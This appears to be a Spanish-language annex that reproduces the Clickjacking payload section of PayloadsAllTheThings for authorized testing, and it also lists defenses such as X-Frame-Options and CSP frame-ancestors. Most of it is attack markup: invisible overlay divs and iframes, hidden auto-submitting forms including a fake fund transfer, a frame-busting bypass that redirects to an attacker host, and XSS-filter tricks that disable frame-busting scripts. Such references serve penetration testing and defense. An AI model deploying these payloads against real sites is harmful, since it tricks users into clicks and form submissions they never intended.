# Clickjacking: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Clickjacking/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Clickjacking/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Metodología / Manipulación de interfaz

```html
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">Click me</a>
</div>
```

### Variantes presentes en tablas o texto del apartado

```text
<div>
opacity: 0;
position: absolute; top: 0; left: 0;
```

## 2. Metodología / Marcos invisibles

````text
  ```html
  <iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
  ```
````

### Variantes presentes en tablas o texto del apartado

```text
<iframe>
```

## 3. Metodología / Secuestro de botones y formularios

```html
    <button onclick="submitForm()">Click me</button>
```

```html
    <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
    <!-- Hidden form fields -->
    </form>
```

```html
    <button onclick="submitForm()">Click me</button>
    <form action="legitimate-site" method="POST" id="hidden-form">
      <!-- Hidden form fields -->
    </form>
    <script>
      function submitForm() {
        document.getElementById('hidden-form').submit();
      }
    </script>
```

## 4. Metodología / Métodos de ejecución

```html
  <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="action" value="transfer-funds">
  </form>
```

```js
  function submitForm() {
    document.getElementById('hidden-form').submit();
  }
```

## 5. Medidas preventivas / Configurar cabecera X-Frame-Options

```apache
Header always append X-Frame-Options SAMEORIGIN
```

## 6. Medidas preventivas / Política de seguridad de contenido (CSP)

```html
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```

## 7. Medidas preventivas / Desactivar JavaScript

```html
    <iframe src="http://target site" security="restricted"></iframe>
```

```html
    <iframe src="http://target site" sandbox></iframe>
```

## 8. Clickjacking / Evento onbeforeunload

```html
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function()
    {
        return " Do you want to leave fictitious.site?";
    }
</script>
<iframe src="http://target site">
```

```php
<?php
    header("HTTP/1.1 204 No Content");
?>
```

```js
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://target site">
```

## 9. XSS Filter / IE8 XSS filter

```html
<script>
    if ( top != self )
    {
        top.location=self.location;
    }
</script>
```

```html
<iframe src=”http://target site/?param=<script>if”>
```

## 10. XSS Filter / Chrome 4.0 XSSAuditor filter

```html
<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>
```

## 11. Clickjacking / Ejercicio

```html
<div style="position: absolute; opacity: 0;">
  <iframe src="https://legitimate-site.com/login" width="500" height="500"></iframe>
</div>
<button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';">Click me</button>
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
